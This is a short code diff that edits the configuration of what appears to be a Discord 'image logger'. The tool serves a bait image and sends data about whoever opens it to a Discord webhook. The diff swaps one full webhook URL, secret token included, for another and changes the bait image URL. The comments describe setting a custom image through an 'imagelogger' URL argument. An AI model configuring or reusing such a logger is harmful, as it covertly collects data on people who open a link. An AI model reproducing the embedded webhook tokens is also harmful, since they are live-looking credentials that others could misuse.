@@ -12,8 +12,8 @@ __author__ = "Vex"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1124821167103021110/xx3cNuaEcVSO8syNHTNcv58C1OvkLkUMroH3crGldm6Ng60mkx63iaPrh45OO6v2aaL3",
-    "image": "https://images.voicy.network/Content/Pages/Images/7c5b4f42-56c8-469f-aef1-cc1dd5d6e318-small.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1133846235036524564/VYaXMY4Bf1783rJgux7NINcJ6iqyWkzVxaBNsMqIBh7HFBAE0cNxai9ADmUGhHCqpLQF",
+    "image": "https://th.bing.com/th?id=OIP.tVBkCBTLIKqWlh-dr6H5tAHaIQ&w=141&h=158&c=8&rs=1&qlt=90&o=6&dpr=1.5&pid=3.1&rm=2", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
